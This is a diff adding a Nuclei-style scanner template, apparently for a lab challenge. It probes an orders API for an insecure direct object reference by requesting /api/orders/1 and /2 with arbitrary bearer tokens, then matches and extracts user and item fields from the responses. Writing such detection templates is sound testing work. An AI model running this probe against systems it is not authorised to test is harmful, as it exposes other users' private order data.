@@ -1,0 +1,55 @@
+id: ch3-idor-api
+
+info:
+  name: IDOR - Insecure Direct Object Reference in Orders API
+  author: manikanta2834
+  severity: high
+  description: |
+    The API endpoint allows access to any order by ID with just an Authorization header present.
+    No proper ownership validation is performed on order access.
+  tags: idor,api,broken-access-control
+
+http:
+  - raw:
+      - |
+        GET /api/orders/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer test-token
+
+      - |
+        GET /api/orders/2 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer any-token
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "elanthriyan"
+          - "mohit"
+          - "laptop"
+          - "phone"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+    extractors:
+      - type: json
+        part: body
+        name: user
+        json:
+          - '.user'
+      
+      - type: json
+        part: body
+        name: item
+        json:
+          - '.item'
